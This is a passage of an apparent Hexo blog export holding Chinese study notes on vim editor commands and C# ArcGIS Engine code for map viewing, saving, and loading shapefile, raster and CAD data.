替换游标以后至行末 ~ 反转游标所在字母大小写 u{n} 撤销一次或n次操作 U(大写) 撤销当前行的所有修改 Ctrl+r redo，即撤销undo的操作 输入2G，跳转到 2 行 2.2.1 使用命令进行快速调整缩进操作这一小节学习如何在vim中进行快速缩进，缩进操作均在普通模式下有效 打开文件进行编辑 $ vim protocols 普通模式下输入15G，跳转到15行 普通模式下输入&gt;&gt; 整行将向右缩进（使用，用于格式化代码超爽） 普通模式下输入&lt;&lt; 整行向左回退 普通模式下输入:进入命令行模式下对shiftwidth值进行设置可以控制缩进和回退的字符数 2.2.2 shiftwidth命令shiftwidth命令是指上一节&gt;&gt;命令产生的缩进（可以简写成sw） 普通模式下输入:进入命令行模式下对shiftwidth值进行设置可以控制缩进和回退的字符数 获取目前的设定值 :set shiftwidth? 设置缩进为10个字符 :set shiftwidth=10 输入 ESC 回到普通模式，再次尝试 &gt;&gt; 看缩进量是否变化 2.2.3 调整文本位置命令行模式下输入:ce(center)命令使本行内容居中 :ce 命令行模式下输入:ri(right)命令使本行文本靠右 :ri 命令行模式下输入:le(left)命令使本行内容靠左 :le 2.3.1 快速查找普通模式下输入 / 然后键入需要查找的字符串 按回车后就会进行查找。？ 与/ 功能相同，只不过 ？ 是向上而 / 是向下查找。 进入查找之后，输入n 和 N 可以继续查找 n表示继续查找，N 反向查找 2.3.2 快速查找练习使用 vim 打开文件进行编辑（搜索高亮需要在配置文件 .vimrc 中设置 set hls ，实验环境中已经设置好了） $ vim protocols 普通模式下输入/icmp然后回车即可查找字符串 icmp 普通模式下输入n查找下一个 icmp 普通模式下输入？tcp向上查找字符串 tcp 普通模式下输入N查找上一个出现的 tcp 命令行模式下输入 noh 然后回车即可取消搜索 2.3.3 高级查找 普通模式下输入\*寻找游标所在处的单词 普通模式下输入\#同上，但 \# 是向前（上）找，\*则是向后（下）找 普通模式下输入g\*同\* ，但部分符合该单词即可 普通模式下输入g\#同\# ，但部分符合该单词即可 以上查找n,N 的继续查找命令依然可以用 2.1.1 使用vim编辑多个文件编辑多个文件有两种形式，一种是在进入vim前使用的参数就是多个文件。另一种就是进入vim后再编辑其他的文件。 同时创建两个新文件并编辑 $ vim 1.txt 2.txt 默认进入1.txt文件的编辑界面 命令行模式下输入 :n 编辑 2.txt 文件，可以加 ! 即 :n! 强制切换，之前一个文件的输入没有保存，仅仅切换到另一个文件 命令行模式下输入 :N 编辑 1.txt 文件，可以加 ! 即 :N! 强制切换，之前文件内的输入没有保存，仅仅是切换到另一个文件 2.1.2 进入vim后打开新文件 命令行模式下输入:e 3.txt 打开新文件3.txt 命令行模式下输入:e# 回到前一个文件 命令行模式下输入:ls可以列出以前编辑过的文档 命令行模式下输入:b 2.txt（或者编号）可以直接进入文件2.txt编辑 命令行模式下输入:bd 2.txt（或者编号）可以删除以前编辑过的列表中的文件项目 命令行模式下输入:e! 4.txt，新打开文件4.txt，放弃正在编辑的文件 命令行模式下输入:f 显示正在编辑的文件名 命令行模式下输入:f new.txt，改变正在编辑的文件名字为new.txt 2.1.3 恢复文件 由于在线环境的特殊性，请在本机尝试 如果因为断电等原因造成文档没有保存，可以采用恢复方式，vim -r进入文档后，输入:ewcover 1.txt来恢复 $ vim -r 1.txt 2.2.1 可视模式命令简介 在普通模式下输入 v（小写），进入字符选择模式，就可以移动光标，光标走过的地方就会选取。再次按下v会后就会取消选取。 在普通模式下输入 Shift+v（小写），进入行选择模式，按下V之后就会把整行选取，您可以上下移动光标选更多的行，同样，再按一次 Shift+v 就可以取消选取。 在普通模式下输入 Ctrl+v（小写），这是区域选择模式，可以进行矩形区域选择，再按一次 Ctrl+v 取消选取。 在可视模式下输入 d 删除选取区域内容 在可视模式下输入y复制选取区域内容 2.3.1 视窗操作简介vim 可以在一个界面里打开多个窗口进行编辑，这些编辑窗口称为 vim 的视窗。 打开方法有很多种，例如可以使用在命令行模式下输入 :new 打开一个新的 vim 视窗，并进入视窗编辑一个新文件（普通模式下输入 Ctrl+w也可以），除了 :new 命令，下述列举的多种方法也可以在命令模式或普通模式下打开新的视窗： 注意：快捷键可能会与浏览器的快捷键冲突，可换为 IE 浏览器进行实验或者在浏览器设置里禁用浏览器快捷键。 命令行模式下输入:sp 1.txt 打开新的水平分屏视窗来编辑1.txt 命令行模式下输入:vsp 2.txt 打开新的垂直分屏视窗来编辑2.txt 普通模式下Ctrl+w s 将当前窗口分割成两个水平的窗口 普通模式下Ctrl+w v 将当前窗口分割成两个垂直的窗口 普通模式下Ctrl+w q 即 :q 结束分割出来的视窗。如果在新视窗中有输入需要使用强制符！即:q! 普通模式下Ctrl+w o 打开一个视窗并且隐藏之前的所有视窗 普通模式下Ctrl+w j 移至下面视窗 普通模式下Ctrl+w k 移至上面视窗 普通模式下Ctrl+w h 移至左边视窗 普通模式下Ctrl+w l 移至右边视窗 普通模式下Ctrl+w J 将当前视窗移至下面 普通模式下Ctrl+w K 将当前视窗移至上面 普通模式下Ctrl+w H 将当前视窗移至左边 普通模式下Ctrl+w L 将当前视窗移至右边 普通模式下Ctrl+w - 减小视窗的高度 普通模式下Ctrl+w + 增加视窗的高度 2.4.1 创建加密文档$ vim -x file1 输入您的密码 确认密码 这样在下一次打开时，vim就会要求你输入密码 在命令行模式中输入!可以执行外部的shell命令 :!ls 用于显示当前目录的内容 :!rm FILENAME用于删除名为 FILENAME 的文件 :w FILENAME可将当前 VIM 中正在编辑的文件另存为 FILENAME 文件 2.7.1 vim的功能设定可以在编辑文件的时候进行功能设定，如命令行模式下输入:set nu（显示行数），设定值退出vim后不会保存。要永久保存配置需要修改vim配置文件。 vim的配置文件~/.vimrc(实验楼环境中配置文件在/etc/vim/vimrc)，可以打开文件进行修改，不过务必小心不要影响vim正常使用 2.7.2 获取目前的设定 命令行模式下输入:set或者:se显示所有修改过的配置 命令行模式下输入:set all 显示所有的设定值 命令行模式下输入:set option? 显示option的设定值 命令行模式下输入:set nooption 取消当前设定值 2.7.3 set功能的说明 命令行模式下输入:set autoindent(ai) 设置自动缩进 命令行模式下输入:set autowrite(aw) 设置自动存档，默认未打开 命令行模式下输入:set background=dark或light，设置背景风格 命令行模式下输入:set backup(bk) 设置自动备份，默认未打开 命令行模式下输入: set cindent(cin) 设置C语言风格缩进 更多详细参数请参考vim手册 ctrl + f # 向后翻一页 ctrl + b # 向前翻一页 ZZ # 保存修改并且退出 D # 删除光标到行尾内容 /字符串 # 向前搜索关键字 ?name # 向后搜索关键字 :149,$s/iii/xxx/gc # 替换指定行的iii为xxx, 全局替换,c是确认提示 :150 # 跳到150行 e a.txt # 打开并编辑指定文件 :n # 编辑下一个文件 :f # 显示当前的文件名 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>vim</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ArcgisEngine鹰眼功能]]></title>
    <url>%2Fposts%2Fbebe3b26%2F</url>
    <content type="text"><![CDATA[// 鹰眼视图功能 ... // OnMapReplaced当mapcontrol1中的地图被替换时，该方法自动加载主空间中所有的图层对象到鹰眼 private void mainMapControl_OnMapReplaced(object sender, IMapControlEvents2_OnMapReplacedEvent e) { if (mainMapControl.Map.LayerCount > 0) { for (int i = 0; i < mainMapControl.Map.LayerCount; i++) { // 加载 eyeMapControl.AddLayer(mainMapControl.get_Layer(i)); } // 鹰眼视图的范围等于mainMap当前的范围 eyeMapControl.Extent = mainMapControl.Extent; eyeMapControl.ActiveView.Refresh(); } } //鹰眼功能 范围更新 // //--2、在主控件中使用鼠标拖拽视图的时候，鹰眼控件中出现红色矩形框 //--2、该方法发生在主视图的范围发生变换后， private void mainMapControl_OnExtentUpdated(object sender, IMapControlEvents2_OnExtentUpdatedEvent e) { IEnvelope pEnvelope = (IEnvelope)e.newEnvelope; IGraphicsContainer pGraphicsContainer = eyeMapControl.Map as IGraphicsContainer; IActiveView pActiveView = pGraphicsContainer as IActiveView; pGraphicsContainer.DeleteAllElements(); IRectangleElement pRectangleEle = new RectangleElementClass(); IElement pElement = pRectangleEle as IElement; pElement.Geometry = pEnvelope; IRgbColor pColor = new RgbColorClass(); pColor.Red = 255; pColor.Green = 0; pColor.Blue = 0; pColor.Transparency = 255; ILineSymbol pOutline = new SimpleLineSymbolClass(); pOutline.Width = 3; pOutline.Color = pColor; pColor = new RgbColorClass(); pColor.Red = 255; pColor.Green = 0; pColor.Blue = 0; pColor.Transparency = 0; IFillSymbol pFillSymbol = new SimpleFillSymbolClass(); pFillSymbol.Color = pColor; pFillSymbol.Outline = pOutline; IFillShapeElement pFillShapeEle = pElement as IFillShapeElement; pFillShapeEle.Symbol = pFillSymbol; pGraphicsContainer.AddElement((IElement)pFillShapeEle, 0); pActiveView.PartialRefresh(esriViewDrawPhase.esriViewGraphics, null, null); } // 鹰眼视图功能 鹰眼视图点击=》主图范围跟着变化 private void eyeMapControl_OnMouseDown(object sender, IMapControlEvents2_OnMouseDownEvent e) { // 如果被点击 if (e.button == 1) { IPoint point = new ESRI.ArcGIS.Geometry.Point(); //获取点击鹰眼视图的点击的位置 point.PutCoords(e.mapX, e.mapY); // 主图的中心位于点击的点point上 mainMapControl.CenterAt(point); mainMapControl.ActiveView.Refresh(); } // 如果是右键 else if (e.button == 2) { IEnvelope pEnv = eyeMapControl.TrackRectangle(); mainMapControl.Extent = pEnv; mainMapControl.ActiveView.Refresh(); } } private void eyeMapControl_OnMouseMove(object sender, IMapControlEvents2_OnMouseMoveEvent e) { if (e.button == 1) { IPoint pPoint = new PointClass(); pPoint.PutCoords(e.mapX, e.mapY); mainMapControl.CenterAt(pPoint); mainMapControl.ActiveView.Refresh(); } } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>GIS</category>
      </categories>
      <tags>
        <tag>ArcEngine</tag>
        <tag>C#</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ArcgisEngine实现地图浏览]]></title>
    <url>%2Fposts%2F1a728c4f%2F</url>
    <content type="text"><![CDATA[全图 private void FullExtentTSButton_Click(object sender, EventArgs e) { mainMapControl.Extent = mainMapControl.FullExtent; } 等比例放大 private void btnZoomInStep_Click(object sender, EventArgs e) { IEnvelope pEnvelope; pEnvelope = mainMapControl.Extent; pEnvelope.Expand(0.5, 0.5, true); //放大2倍 mainMapControl.Extent = pEnvelope; mainMapControl.ActiveView.Refresh(); } 等比例缩小 private void btnZoomIOutStep_Click(object sender, EventArgs e) { IActiveView pActiveView = mainMapControl.ActiveView; IPoint centerPoint = new PointClass(); centerPoint.PutCoords((pActiveView.Extent.XMin + pActiveView.Extent.XMax) / 2, (pActiveView.Extent.YMax + pActiveView.Extent.YMin) / 2); IEnvelope envlop = pActiveView.Extent; envlop.Expand(1.5, 1.5, true); //与放大的区别在于Expand的参数不同 pActiveView.Extent.CenterAt(centerPoint); pActiveView.Extent = envlop; pActiveView.Refresh(); //如果觉得乱的话，直接修改放大的参数也将就可以 非万不得已不用 //IEnvelope pEnvelope; //pEnvelope = mainMapControl.Extent; //pEnvelope.Expand(1.5, 1.5, true); //放大2倍 //mainMapControl.Extent = pEnvelope; //mainMapControl.ActiveView.Refresh(); } 上一视图 // 定义全局变量 IExtentStack pExtentStack; private void PreViewTSButton_Click(object sender, EventArgs e) { pExtentStack = mainMapControl.ActiveView.ExtentStack; //判断是否可以回到前一视图，第一个视图没有前视图 if (pExtentStack.CanUndo()) { pExtentStack.Undo(); //撤销到上一视图范围 NextViewTSButton.Enabled = true; //后一视图可以使用 if (!pExtentStack.CanUndo()) { PreViewTSButton.Enabled = false; //前一视图不能使用 } } mainMapControl.ActiveView.Refresh(); } 下一视图 private void NextViewTSButton_Click(object sender, EventArgs e) { pExtentStack = mainMapControl.ActiveView.ExtentStack; //判断是否可以回到后一视图，最后一个视图没有后一视图 if (pExtentStack.CanRedo()) //如果可以重做下一视图 { pExtentStack.Redo(); //重做到下一视图 PreViewTSButton.Enabled = true; //上一视图按钮可以使用 if (!pExtentStack.CanRedo()) //如果不可以重做下一视图 { NextViewTSButton.Enabled = false; //下一视图不能用 } } mainMapControl.ActiveView.Refresh(); } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>GIS</category>
      </categories>
      <tags>
        <tag>ArcEngine</tag>
        <tag>GIS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ArcEngine文件保存功能]]></title>
    <url>%2Fposts%2Fdb6b7e01%2F</url>
    <content type="text"><![CDATA[地图文档保存问题：空文档也能保存private void saveToolStrip_Click(object sender, EventArgs e) { try { string sMxdFileName = mainMapControl.DocumentFilename; IMapDocument pMapDocument = new MapDocumentClass(); //检查文档是否为空以及有效性 if (sMxdFileName != null && mainMapControl.CheckMxFile(sMxdFileName)) { if (pMapDocument.get_IsReadOnly(sMxdFileName)) { MessageBox.Show("地图本当为只读，不能保存！"); pMapDocument.Close(); return; } else { SaveFileDialog pSaveFileDialog = new System.Windows.Forms.SaveFileDialog(); pSaveFileDialog.Title = "请选择保存路径"; pSaveFileDialog.Filter = "ArcMap文档(*.mxd)|*.mxd|ArcMap模板(*.mxt)|*.mxt"; //当相同的文件存在是提示错误 pSaveFileDialog.OverwritePrompt = true; pSaveFileDialog.RestoreDirectory = true; if (pSaveFileDialog.ShowDialog() == DialogResult.OK) { //获取名字 sMxdFileName = pSaveFileDialog.FileName; } else { return; } pMapDocument.New(sMxdFileName); pMapDocument.ReplaceContents(mainMapControl.Map as IMxdContents); //保存为绝对路径 pMapDocument.Save(pMapDocument.UsesRelativePaths, true); pMapDocument.Close(); MessageBox.Show("保存文档成功"); } } } catch (Exception ex) { MessageBox.Show(ex.Message); } } 地图文档另存为1private void saveAsToolStrip_Click(object sender, EventArgs e) { try { SaveFileDialog pSaveDialog = new System.Windows.Forms.SaveFileDialog(); pSaveDialog.Title = "另存为"; pSaveDialog.OverwritePrompt = true;//当相同的文件存在是提示错误 pSaveDialog.Filter = "ArcMap文档(*.mxd)|*.mxd|ArcMap模板(*.mxt)|*.mxt"; pSaveDialog.RestoreDirectory = true; if (pSaveDialog.ShowDialog() == DialogResult.OK) { string sFilePath = pSaveDialog.FileName; IMapDocument pMapDocument = new MapDocumentClass(); pMapDocument.New(sFilePath); pMapDocument.ReplaceContents(mainMapControl.Map as IMxdContents); pMapDocument.Save(true, true); pMapDocument.Close(); } } catch (Exception ex) { MessageBox.Show(ex.Message); } } 地图另存为2 ICommand command = new ControlsSaveAsDocCommandClass(); command.OnCreate(mainMapControl.Object); command.OnClick(); document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>GIS</category>
      </categories>
      <tags>
        <tag>ArcEngine</tag>
        <tag>GIS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ArcEngine初识 -- 打开地图]]></title>
    <url>%2Fposts%2F210c46ef%2F</url>
    <content type="text"><![CDATA[一句代码 创建winform程序 必须要添加LicenseControl控件 TOCControl视图控件 =&gt; 属性,设置关联属性绑定(Buddy)到地图控件上 ToolbalControl工具条控件 伙伴控价 =&gt; 设置关联属性绑定到地图控件上 MapControl地图控件 也可以设置属性设置默认打开的地图 引用ESRI.ArcGIS.Version 在主程序代码中加入：//在窗口加载前添加 绑定产品码 // 注意是 program.cs文件 ESRI.ArcGIS.RuntimeManager.Bind(ESRI.ArcGIS.ProductCode.EngineOrDesktop); 才能正常运行 常见的AE控价 PageLayoutControl 布局视图 TOOControl 内容列表 MapControl 数据视图 打开地图文档F1 自己写的//打开mxd文档 F1 try { //实例化一个对象 OpenFileDialog open = new OpenFileDialog(); //设置参数 //检查文件是否存在 open.CheckFileExists = true; open.Title = "打开地图文档"; // 不允许多个文件同时打开 open.Multiselect = false; // 存储时打开的文件路径 open.RestoreDirectory = true; //打开文件格式 open.Filter = "地图文档(*.mxd)|*.mxd;|ArcMap模板(*.mxt)|*.mxt";|所有地图格式(*.mxd;*.mxt;*.pmf)|*.mxd;*.mxt;*.pmf"/文件过滤条件 open.Multiselect = false;//禁止多选 open.RestoreDirectory = true; // 存储打开的文件路径 //判断如果文件正常打开 if (open.ShowDialog() == DialogResult.OK) { // 获取文件路径 path+name string fileName = open.FileName; // 数据窗口加载地图文档 axMapControl1.LoadMxFile(fileName); // 刷新一下页面 axMapControl1.ActiveView.Refresh(); // 伙伴控件可以通过下面的方式来进行绑定 axTOCControl1.SetBuddyControl(axMapControl1); } } catch(Exception) { MessageBox.Show("请打开正确的文档!", "提醒", MessageBoxButtons.OK, MessageBoxIcon.Information); } } F2 使用IMapControl接口的LoadMxFile方法 OpenFileDialog open = new OpenFileDialog(); //设置参数 //检查文件是否存在 open.CheckFileExists = true; open.Title = "打开地图文档"; // 不允许多个文件同时打开 open.Multiselect = false; // 存储时打开的文件路径 open.RestoreDirectory = true; //打开文件格式 open.Filter = "地图文档(*.mxd)|*.mxd;|ArcMap模板(*.mxt)|*.mxt;|所有地图格式(*.mxd;*.mxt;*.pmf)|*.mxd;*.mxt;*.pmf";//文件过滤条件 open.Multiselect = false;//禁止多选 open.RestoreDirectory = true; // 存储打开的文件路径 open.ShowDialog(); //文件名 string fileName = open.FileName; if (fileName == "") { return; } //检查地图文档有效性 if (mainMapControl.CheckMxFile(fileName)) { mainMapControl.LoadMxFile(fileName); mainMapControl.ActiveView.Refresh(); } else { MessageBox.Show(fileName + "是无效的地图文档!", "信息提示"); return; } F3 使用IMapDocument接口// using ESRI.ArcGIS.Carto; OpenFileDialog open = new OpenFileDialog(); //设置参数 //检查文件是否存在 open.CheckFileExists = true; open.Title = "打开地图文档"; // 不允许多个文件同时打开 open.Multiselect = false; // 存储时打开的文件路径 open.RestoreDirectory = true; //打开文件格式 open.Filter = @"地图文档(*.mxd)|*.mxd;|ArcMap模板(*.mxt)|*.mxt;|所有地图格式(*.mxd;*.mxt;*.pmf)|*.mxd;*.mxt;*.pmf";//文件过滤条件 open.Multiselect = false;//禁止多选 open.RestoreDirectory = true; //打开窗口 open.ShowDialog(); // 存储打开的文件路径 string fileName = open.FileName; if (mainMapControl.CheckMxFile(fileName)) { //将数据载入pMapDocument并与Map控件关联 IMapDocument pMapDocument = new MapDocument(); // using ESRI.ArcGIS.Carto; pMapDocument.Open(fileName, ""); //获取Map地图中激活的地图文档 mainMapControl.Map = pMapDocument.ActiveView.FocusMap; mainMapControl.ActiveView.Refresh(); } F4 使用ControlsOpenDocCommandClass类库资源 =》 适合比赛用//using ESRI.ArcGIS.Controls; ICommand command = new ControlsOpenDocCommandClass(); //using ESRI.ArcGIS.Controls; command.OnCreate(mainMapControl.Object); command.OnClick(); mainTOCControl.SetBuddyControl(mainMapControl); 待改进之处： 窗口的大小以及出现的位置，美化 Form的name随着文档的名字改变 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>GIS</category>
      </categories>
      <tags>
        <tag>ArcEngine</tag>
        <tag>GIS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ArcEngine同步数据视图与布局视图]]></title>
    <url>%2Fposts%2F4c9b4c5b%2F</url>
    <content type="text"><![CDATA[// 数据视图与布局视图同步 private void mainMapControl_OnAfterScreenDraw(object sender, IMapControlEvents2_OnAfterScreenDrawEvent e) { IActiveView pActiveView = (IActiveView)mainPageLayoutControl1.ActiveView.FocusMap; IDisplayTransformation displayTransformation = pActiveView.ScreenDisplay.DisplayTransformation; displayTransformation.VisibleBounds = mainMapControl.Extent; mainPageLayoutControl1.ActiveView.Refresh(); CopyToPageLayout(); // 调用下面的函数 } // CopyToPageLayout() 布局视图与数据视图同步 private void CopyToPageLayout() { IObjectCopy pObjectCopy = new ObjectCopyClass(); object copyFromMap = mainMapControl.Map; object copiedMap = pObjectCopy.Copy(copyFromMap); // 复制地图到copiedMap中 object copyToMap = mainPageLayoutControl1.ActiveView.FocusMap; pObjectCopy.Overwrite(copiedMap, ref copyToMap); // 复制地图 mainPageLayoutControl1.ActiveView.Refresh(); } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>GIS</category>
      </categories>
      <tags>
        <tag>ArcEngine</tag>
        <tag>GIS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ArcEngine加载数据]]></title>
    <url>%2Fposts%2F980b1709%2F</url>
    <content type="text"><![CDATA[加载shapefile数据F1 使用AddShapefile方法 private void 添加ShapefileToolStripMenuItem_Click(object sender, EventArgs e) { try { //同样实例化一个打开文件的类对象 OpenFileDialog open = new OpenFileDialog(); // 如果打开正确 if (open.ShowDialog() == DialogResult.OK) { //首先定义一个空的路径 string filePath = string.Empty; // 然后定义一个空的文件名 string file = string.Empty; // 获取完整的文件路径 string filedir = open.FileName; //如果路径为空，嘛都不返回 if (fileDir == "") return; // 对完整路径进行截取 获取最后一个斜杠的索引 int pos = filedir.LastIndexOf('\\'); // 截取字符串 路径 filePath =filedir.Substring(0, pos); //文件名 file = filedir.Substring(pos+1); // 需要两个参数 axMapControl1.AddShapeFile(filePath, file); //刷新 axMapControl1.ActiveView.Refresh(); } } catch (Exception) { MessageBox.Show("请打开正确的文档!", "提醒",MessageBoxButtons.OK, MessageBoxIcon.Error ); } } F2 使用工作空间思路: 创建ShapefileWorkspaceFactory实例，使用OpenFromFile方法打开工作区。 创建FeatureLayer的实例，定义数据集。 使用AddLayer方法加载数据。 using ESRI.ArcGIS.Geodatabase; using ESRI.ArcGIS.DataSourcesFile; using ESRI.ArcGIS.DataSourcesRaster; OpenFileDialog open = new OpenFileDialog(); open.CheckFileExists = true; open.Title = "打开Shape文件"; open.RestoreDirectory = true; open.Filter = "Shape文件(*.shp)|**.shp"; open.RestoreDirectory = true; open.ShowDialog(); //获取完整的文件路径 :path+name string fileDir = open.FileName; //路径为空不返回 if (fileDir == "") return; // 对完整路径进行截取 int pos = fileDir.LastIndexOf("\\"); // 路径 string pfilePath = fileDir.Substring(0, pos); //文件名 string file = fileDir.Substring(pos + 1); //实例化ShapefileWorkspaceFactory工作空间，打开Shape文件 IWorkspaceFactory pWsFactory = new ShapefileWorkspaceFactoryClass(); //强制转换 打开路径 IFeatureWorkspace pWorkSpace = pWsFactory.OpenFromFile(pfilePath, 0) as IFeatureWorkspace; //创建并实例化要素类 IFeatureClass pFeatureClass = pWorkSpace.OpenFeatureClass(file); IFeatureLayer pFeatureLayer = new FeatureLayerClass(); pFeatureLayer.Name = pFeatureClass.AliasName; pFeatureLayer.FeatureClass = pFeatureClass; mainMapControl.Map.AddLayer(pFeatureLayer); mainMapControl.ActiveView.Refresh(); mainTOCControl.SetBuddyControl(mainMapControl); 加载栅格数据主要用到以下2个接口： IRasterPyramid3接口提供对栅格数据集的金字塔属性的访问 Present属性–判断栅格数据集是否存在金字塔 Create方法–为栅格数据集创建金字塔 IRasterLayer接口继承自ILayer接口 CreateFromDataset方法–从已有的栅格数据集对象创建图层 CreateFromRaster方法–从已有的栅格对象创建图层 Raster属性–获取IRasterLayer接口中的Raster对象 DisplayResolutionFactor属性–设置栅格数据的分辨率 1.直接用IRasterLayer接口打开一个栅格文件并加载到地图控件 IRasterLayer rasterLayer = new RasterLayerClass(); rasterLayer.CreateFromFilePath(fileName); // fileName指存本地的栅格文件路径 axMapControl1.AddLayer(rasterLayer, 0); 2.思路: (1)使用OpenFromFile方法获得栅格文件的工作区 (2)使用OpenRasterDataset方法获得栅格文件的数据集 (3)判断栅格数据集是否具有金字塔 (4)创建pRasterLayer，并定义数据集 (5)使用AddLayer方法加载数据` OpenFileDialog pOpenFileDialog = new OpenFileDialog(); pOpenFileDialog.CheckFileExists = true; pOpenFileDialog.Title = "加载栅格数据"; pOpenFileDialog.Filter = "栅格文件(*.*)|*.bmp;*.tif;*.jpg;*.img;|BMP(*.bmp)|*.bmp;|TIF(*.tif)|*.tif;|JPG(*.jpg)|*.jpg;|IMG(*.img)|*.img"; pOpenFileDialog.ShowDialog(); //获取名字 string pRasterFilename = pOpenFileDialog.FileName; if (pRasterFilename == "") return; // IO里面获取文件名字与路径的固定用法 string pPath = System.IO.Path.GetDirectoryName(pRasterFilename); string pFileName = System.IO.Path.GetFileName(pRasterFilename); IWorkspaceFactory pWorkspaceFactory = new RasterWorkspaceFactory(); IWorkspace pWorkspace = pWorkspaceFactory.OpenFromFile(pPath, 0); IRasterWorkspace pRasterWorkspace = pWorkspace as IRasterWorkspace; IRasterDataset pRasterDataset = pRasterWorkspace.OpenRasterDataset(pFileName); //影像金字塔的判断与创建 IRasterPyramid3 pRasPyramid; pRasPyramid = pRasterDataset as IRasterPyramid3; if (pRasPyramid != null) { if (!(pRasPyramid.Present)) { //创建金字塔 pRasPyramid.Create(); } } IRaster pRaster; pRaster = pRasterDataset.CreateDefaultRaster(); IRasterLayer pRasterLayer; pRasterLayer = new RasterLayerClass(); pRasterLayer.CreateFromRaster(pRaster); ILayer pLayer = pRasterLayer as ILayer; mainMapControl.AddLayer(pLayer, 0); ### 加载CAD数据 ###### 1.作为矢量图层加载 === 1)分图层加载 IWorkspaceFactory pWorkspaceFactory; IFeatureWorkspace pFeatureWorkspace; pWorkspaceFactory = new CadWorkspaceFactory(); pFeatureWorkspace = (IFeatureWorkspace)pWorkspaceFactory.OpenFromFile(pPath, 0); //加载CAD文件中的线文件 IFeatureClass pFeatureClass = pFeatureWorkspace.OpenFeatureClass(pFileName + ":polyline"); IFeatureLayer pFeatureLayer = new FeatureLayerClass(); pFeatureLayer.Name = pFileName; pFeatureLayer.FeatureClass = pFeatureClass; mainMapControl.Map.AddLayer(pFeatureLayer); mainMapControl.ActiveView.Refresh(); mainTOCControl.SetBuddyControl(mainMapControl); ###### 2.作为矢量图层加载 === 1)整幅图加载 //打开CAD数据集 IWorkspaceFactory pWorkspaceFactory = new CadWorkspaceFactoryClass(); //using ESRI.ArcGIS.DataSourcesFile; IFeatureWorkspace pFeatureWorkspace = pWorkspaceFactory.OpenFromFile(pPath, 0) as IFeatureWorkspace; //打开一个要素集 IFeatureDataset pFeatureDataset = pFeatureWorkspace.OpenFeatureDataset(pFileName); // IFeatureContainer可以管理IFeatureDataset中的每个要素类 IFeatureClassContainer pFeatureContainer = (IFeatureClassContainer)pFeatureDataset; //对CAD文件中的要素进行遍历处理 for (int i = 0; i &lt; pFeatureContainer.ClassCount; i++) { IFeatureClass pFeatureClass = pFeatureContainer.get_Class(i); //如果是注记， 则添加注记层 if (pFeatureClass.FeatureType == esriFeatureType.esriFTCoverageAnnotation) { IFeatureLayer pFeatureLayer = new FeatureLayerClass(); pFeatureLayer.Name = pFeatureClass.AliasName; pFeatureLayer.FeatureClass = pFeatureClass; mainMapControl.Map.AddLayer(pFeatureLayer); } else //如果是点线面则添加要素层 { IFeatureLayer pFeatureLayer = new FeatureLayerClass(); pFeatureLayer.Name = pFeatureClass.AliasName; pFeatureLayer.FeatureClass = pFeatureClass; mainMapControl.Map.AddLayer(pFeatureLayer); } mainMapControl.ActiveView.Refresh(); mainTOCControl.SetBuddyControl(mainMapControl); } ###### F3.作为栅格图层加载 IWorkspaceFactory pWorkspaceFactory; IWorkspace pWorkspace; ICadDrawingDataset pCadDrawingDataset; ICadDrawingWorkspace pCadDrawingWorkspace; ICadLayer pCadLayer; pWorkspaceFactory = new CadWorkspaceFactoryClass(); pWorkspace = pWorkspaceFactory.OpenFromFile(pPath, 0); pCadDrawingWorkspace = (ICadDrawingWorkspace)pWorkspace; //获得CAD文件的数据集 pCadDrawingDataset = pCadDrawingWorkspace.OpenCadDrawingDataset(pFileName); pCadLayer = new CadLayerClass(); pCadLayer.CadDrawingDataset = pCadDrawingDataset; mainMapControl.Map.AddLayer(pCadLayer); mainMapControl.ActiveView.Refresh(); mainTOCControl.SetBuddyControl(mainMapControl); ###### 加载个人地理数据库 ###### 加载文件地理数据库 ` document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); 